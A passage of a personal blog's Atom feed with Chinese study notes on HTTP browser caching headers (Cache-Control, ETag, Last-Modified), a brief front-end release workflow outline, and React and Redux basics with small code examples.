href="#协商缓存-向服务器发送请求服务器会根据这个请求的request-header的一些参数来判断是否命中协商缓存如果命中则返回304状态码并带上新的response-header通知浏览器从缓存中读取资源"></a> 协商缓存: 向服务器发送请求，服务器会根据这个请求的request header的一些参数来判断是否命中协商缓存，如果命中，则返回304状态码并带上新的response header通知浏览器从缓存中读取资源；</h5><p><img src="https://user-gold-cdn.xitu.io/2019/5/6/16a8bc3172e3a167?w=293&amp;h=47&amp;f=png&amp;s=3340" alt="" /></p><h4 id="4-强缓存和协商缓存的header参数"><a class="markdownIt-Anchor" href="#4-强缓存和协商缓存的header参数"></a> 4. 强缓存和协商缓存的header参数</h4><p>强缓存：</p><p>Expires：过期时间，如果设置了时间，则浏览器会在设置的时间内直接读取缓存，不再请求</p><p>Cache-Control：当值设为max-age=300时，则代表在这个请求正确返回时间（浏览器也会记录下来）的5分钟内再次加载资源，就会命中强缓存。</p><p>cache-control：除了该字段外，还有下面几个比较常用的设置值：</p><pre><code>（1） max-age：用来设置资源（representations）可以被缓存多长时间，单位为秒；（2） s-maxage：和max-age是一样的，不过它只针对代理服务器缓存而言；（3）public：指示响应可被任何缓存区缓存；（4）private：只能针对个人用户，而不能被代理服务器缓存；（5）no-cache：强制客户端直接向服务器发送请求,也就是说每次请求都必须向服务器发送。服务器接收到     请求，然后判断资源是否变更，是则返回新内容，否则返回304，未变更。这个很容易让人产生误解，使人误     以为是响应不被缓存。实际上Cache-Control:     no-cache是会被缓存的，只不过每次在向客户端（浏览器）提供响应数据时，缓存都要向服务器评估缓存响应的有效性。（6）no-store：禁止一切缓存（这个才是响应不被缓存的意思）。</code></pre><p>协商缓存：</p><p>Last-Modifued/If-Modified-Since和Etag/If-None-Match是分别成对出现的，呈一一对应关系</p><h5 id="etagif-none-match"><a class="markdownIt-Anchor" href="#etagif-none-match"></a> Etag/If-None-Match：</h5><p>Etag：</p><blockquote><p>Etag是属于HTTP 1.1属性，它是由服务器（Apache或者其他工具）生成返回给前端，用来帮助服务器控制Web端的缓存验证。<br />Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</p></blockquote><p>If-None-Match:</p><blockquote><p>当资源过期时，浏览器发现响应头里有Etag,则再次像服务器请求时带上请求头if-none-match(值是Etag的值)。服务器收到请求进行比对，决定返回200或304</p></blockquote><p><img src="https://user-gold-cdn.xitu.io/2019/5/6/16a8c60fb0ef49f0?w=918&amp;h=279&amp;f=png&amp;s=20766" alt="" /></p><h5 id="last-modifuedif-modified-since"><a class="markdownIt-Anchor" href="#last-modifuedif-modified-since"></a> Last-Modifued/If-Modified-Since：</h5><p>Last-Modified：</p><blockquote><p>浏览器向服务器发送资源最后的修改时间</p></blockquote><p>If-Modified-Since：</p><blockquote><p>当资源过期时（浏览器判断Cache-Control标识的max-age过期），发现响应头具有Last-Modified声明，则再次像服务器请求时带上头if-modified-since，表示请求时间。服务器收到请求后发现有if-modified-since则与被请求资源的最后修改时间进行对比（Last-Modified）,若最后修改时间较新（大），说明资源又被改过，则返回最新资源，HTTP 200 OK;若最后修改时间较旧（小），说明资源无新修改，响应HTTP 304 走缓存。</p></blockquote><blockquote><p>Last-Modifued/If-Modified-Since的时间精度是秒，而Etag可以更精确。<br />Etag优先级是高于Last-Modifued的，所以服务器会优先验证Etag</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文将介绍强制缓存（200）和协商缓存（304）的区别&lt;/p&gt;
&lt;h4 id=&quot;1-什么是缓存&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是缓存&quot;&gt;&lt;/a&gt; 1. 什么是缓存？&lt;/h4&gt;
&lt;p&gt;浏览器缓存(Brower Caching</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>浏览器缓存的了解</title>
    <link href="https://harrypangpang.github.io/2019/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9A%84%E4%BA%86%E8%A7%A3/"/>
    <id>https://harrypangpang.github.io/2019/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9A%84%E4%BA%86%E8%A7%A3/</id>
    <published>2019-04-10T02:44:03.000Z</published>
    <updated>2023-02-23T03:30:13.100Z</updated>
    
    <content type="html"><![CDATA[<ol><li>浏览器缓存 主要指的是 htttp的缓存 ，即协议层的缓存</li><li>协议层的缓存 分为 强制缓存 和 对比缓存</li></ol><p>强制缓存：<br />概念：只有当 缓存失效时 才会向服务器获取最新资源。<br />方式： Expires  和  Cache-Control</p><p>1.Expires：<br />Expires: Thu, 10 Nov 2017 08:45:11 GMT<br />绝对时间，受客户端本地时间的影响，修改后会导致浏览器的缓存判断失效，而重新请求。并且 修改后会导致 客户端 与服务端时间不一致，使得缓存失效</p><p>2.Cache-Control：<br />例：  Response Header：<br />Cache-Control：max-age=25454500<br />max-age：即最大有效时间，在上面的例子中我们可以看到<br />no-cache：表示没有缓存，即告诉浏览器该资源并没有设置缓存<br />s-maxage：同max-age，但是仅用于共享缓存，如CDN缓存<br />public：多用户共享缓存，默认设置<br />private：不能够多用户共享，HTTP认证之后，字段会自动转换成private。<br />相对时间，所以不会受客户端的 影响。可配置性强。</p><p>对比缓存：<br />概念：简单来说就是 先去找缓存，然后获取缓存的标识，拿着标识去服务请求 确认该数据是否更新过，<br />如果更新了 就返回最新的数据。否则 返回304，从缓存中获取数据。<br />方式：Last-Modified和If-Modified-Since  和 Etag</p><p>Last-Modified：服务器告知客户端，资源最后一次被修改的时间<br />例： Response Header：<br />Last-Modified: Thu, 10 Nov 2015 08:45:11 GMT</p><p>If-Modified-Since：<br />再次请求时，请求头中带有该字段，服务器会将If-Modified-Since的值与Last-Modified字段进行对比，<br />如果相等，则表示未修改，响应304；<br />反之，则表示修改了，响应200状态码，返回数据。</p><p>Etag：就是个hash值。每次随着数据资源返回，来回传递，进行识别对比，来判断是否返回304或者数据资源</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;浏览器缓存 主要指的是 htttp的缓存 ，即协议层的缓存&lt;/li&gt;
&lt;li&gt;协议层的缓存 分为 强制缓存 和 对比缓存&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;强制缓存：&lt;br /&gt;
概念：只有当 缓存失效时 才会向服务器获取最新资源。&lt;br /&gt;
方式： Expires</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>发布流程</title>
    <link href="https://harrypangpang.github.io/2019/03/01/%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B/"/>
    <id>https://harrypangpang.github.io/2019/03/01/%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B/</id>
    <published>2019-03-01T07:28:21.000Z</published>
    <updated>2023-02-23T03:30:13.100Z</updated>
    
    <content type="html"><![CDATA[<h3 id="不能算是正规的发布系统只是按照自己的需求-能力和想法实现的一个简单的自动化"><a class="markdownIt-Anchor" href="#不能算是正规的发布系统只是按照自己的需求-能力和想法实现的一个简单的自动化"></a> 不能算是正规的发布系统，只是按照自己的需求、能力和想法实现的一个简单的自动化</h3><h5 id="主要涉及的地方"><a class="markdownIt-Anchor" href="#主要涉及的地方"></a> 主要涉及的地方</h5><ol><li>代码仓库</li><li>静态资源站点</li><li>web站点</li></ol><h5 id="逻辑"><a class="markdownIt-Anchor" href="#逻辑"></a> 逻辑</h5><ol><li><p>打包</p><pre><code> 1. 从代码仓库拉取代码到静态资源站点 2. 生成版本号（即时间戳）命名的文件夹 3. 输出版本号</code></pre></li><li><p>发布<br />1. 修改输出HTML引用文件的版本号</p></li></ol><h5 id="功能"><a class="markdownIt-Anchor" href="#功能"></a> 功能</h5><ol><li>web服务</li><li>静态资源站点</li><li>可视化发布站点</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;不能算是正规的发布系统只是按照自己的需求-能力和想法实现的一个简单的自动化&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#不能算是正规的发布系统只是按照自己的需求-能力和想法实现的一个简单的自动化&quot;&gt;&lt;/a&gt; 不能算是正规的发布系统，只</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>React学习笔记</title>
    <link href="https://harrypangpang.github.io/2019/02/26/React%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://harrypangpang.github.io/2019/02/26/React%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2019-02-26T06:39:32.000Z</published>
    <updated>2023-02-23T03:30:13.096Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>React是一种  声明式   高效 灵活 构建用户界面的框架</p></li><li><p>组件 ：React.Component{}</p></li><li><p>组件是接受 名为 props的参数 {<a href="http://this.props.name">this.props.name</a>}， 即 当前组件被应用时， 传入的各个数据，包括事件等；</p></li></ol><p>4.render返回的是一个React元素 ：渲染内容的描述   一般使用JSX语法来扩展  ： <div /> -----&gt; React.createElement(“div”)</p><p>5.通过 <ShoppingList /> 这样的标签你就可以在 React 当中调用整个 ShoppingList 组件</p><ol start="6"><li><p>添加样式用  className = “aaaa”,  事件： onClick={ () =&gt; alert(“click”)}</p></li><li><p>this.state 为自身设置自身的状态数据，  存储变化的数据</p></li><li><p>this.setState 用于设置 值 ，每次触发时都会开始准备更新组件 跟随数据改变了的内容。</p></li></ol><p>状态提升：</p><ol start="9"><li><p>子组件的state数据提升至共同的 父组件 中保存。然后 父组件 通过Props  将 状态 数据传递到子组件中     ------&gt;  方便状态数据共享交流</p></li><li><p>key React当中使用的一种特殊的属性，(以及ref属性)，无法通过props获取到key，React会自动判断元素更新时使用key，而组件自己无法获取到key的。<br />组件key值被改变就会被当作新创建的组件处理。<br />组件的 keys 值并不需要在全局都保证唯一，只需要在当前的节点里保证唯一即可</p></li></ol><p>二.Redux<br />概念：<br />（1）Web 应用是一个状态机，视图与状态是一一对应的。</p><p>（2）所有的状态，保存在一个对象里面。</p><p>Store:<br />保存数据的地方，看成一个容器， 整个应用只能有一个store</p><p>提供的方法函数： createStore，用于生成store，接受了另一个函数参数，返回新生成的store对象<br />例：import { createStore } from ‘redux’;<br />const store = createStore(fn);<br />State：<br />时点的数据集合叫做 State， 如，当前时刻的 State，通过 store.getState() 拿到<br />import { createStore } from ‘redux’;<br />const store = createStore(fn);<br />const state = store.getState();<br />Redux 规定， 一个 State 对应一个 View。只要 State 相同，View 就相同。你知道 State，就知道 View 是什么样，反之亦然。</p><p>Action：<br />Action 就是 View 发出的通知，表示 State 应该要发生变化了<br />Action 是一个对象。其中的type属性是必须的。表示Action 的名称。其他属性可以自由设置，<br />const action = {<br />type: ‘ADD_TODO’,<br />payload: ‘Learn Redux’<br />};<br />可以这样理解，Action 描述当前发生的事情。改变 State 的唯一办法，就是使用 Action。它会运送数据到 Store。</p><p>Action Creator:<br />View 要发送多少种消息，就会有多少种 Action。如果都手写，会很麻烦。可以定义一个函数来生成 Action，这个函数就叫 Action Creator。</p><p>例：<br />const ADD_TODO = ‘添加 TODO’;</p><p>function addTodo(text) {<br />return {<br />type: ADD_TODO,<br />text<br />}<br />}</p><p>const action =addTodo(‘Learn Redux’);</p><p>store.dispatch()：</p><p>store.dispatch()是 View 发出 Action 的唯一方法。<br />store.dispatch接受一个 Action 对象作为参数，将它发送出去<br />store.dispatch(addTodo(‘Learn Redux’));</p><p>Reducer：<br />Store 收到 Action 以后，必须给出一个新的 State，这样 View 才会发生变化。这种 State 的计算过程就叫做 Reducer。<br />例：</p><p>const defaultState = 0;<br />const reducer = (state = defaultState, action) =&gt; {<br />switch (action.type) {<br />case ‘ADD’:<br />return state + action.payload;<br />default:<br />return state;<br />}};</p><p>const state = reducer(1, {<br />type: ‘ADD’,<br />payload: 2});</p><p>createStore接受 Reducer 作为参数，生成一个新的 Store。以后每当store.dispatch发送过来一个新的 Action，就会自动调用 Reducer，得到新的 State。<br />例：</p><p>const actions = [<br />{ type: ‘ADD’, payload: 0 },<br />{ type: ‘ADD’, payload: 1 },<br />{ type: ‘ADD’, payload: 2 }];</p><p>const total = actions.reduce(reducer, 0); // 3</p><p>纯函数： 只要是同样的输入，必定得到同样的输出。</p><p>store.subscribe()：<br />方法设置监听函数，一旦 State 发生变化，就自动执行这个函数。<br />例：</p><p>import { createStore } from ‘redux’;<br />const store = createStore(reducer);</p><p>store.subscribe(listener);</p><p>只要把 View 的更新函数（对于 React 项目，就是组件的render方法或setState方法）放入listen，就会实现 View 的自动渲染。<br />store.subscribe方法返回一个函数，调用这个函数就可以解除监听。</p><p>Reducer 的拆分：<br />combinReducers:用于 Reducer 的拆分。你只要定义各个子 Reducer 函数，然后用这个方法，将它们合成一个大的 Reducer。<br />例：</p><p>import { combineReducers } from ‘redux’;</p><p>const chatReducer = combineReducers({<br />chatLog,<br />statusMessage,<br />userName<br />})</p><p>export default todoApp;<br />State 的属性名必须与子 Reducer 同名</p><p>不同名的写法：</p><p>const reducer = combineReducers({<br />a: doSomethingWithA,<br />b: processB,<br />c: c<br />})<br />// 等同于<br />function reducer(state = {}, action) {<br />return {<br />a: doSomethingWithA(state.a, action),<br />b: processB(state.b, action),<br />c: c(state.c, action)<br />}}</p><p>可以把所有子 Reducer 放在一个文件里面，然后统一引入。</p><p>import { combineReducers } from ‘redux’<br />import * as reducers from ‘./reducers’</p><p>const reducer = combineReducers(reducers)</p><p>Redux流程：<br />1.用户发出Action–&gt; stroe.dispatch(action);<br />2.store自动调用Reducer,传入（当前state，action），返回新的State。<br />例： let nextState = todoApp（previousState，action）；</p><p>3.state发生变化，store会调用监听函数。：</p><p>例：stroe.subscribe(listener);</p><p>listener可以通过 store.getStore() 得到当前状态，react此时会触发重新渲染view；</p><p>例：</p><p>function listerner() {<br />let newState = store.getState();<br />component.setState(newState);<br />}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;React是一种  声明式   高效 灵活 构建用户界面的框架&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;组件 ：React.Component{}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;组件是接受 名为 props的参数 {&lt;a href=&quot;http://th</summary>
      
    
    
    
    
  </entry>
  
</feed>
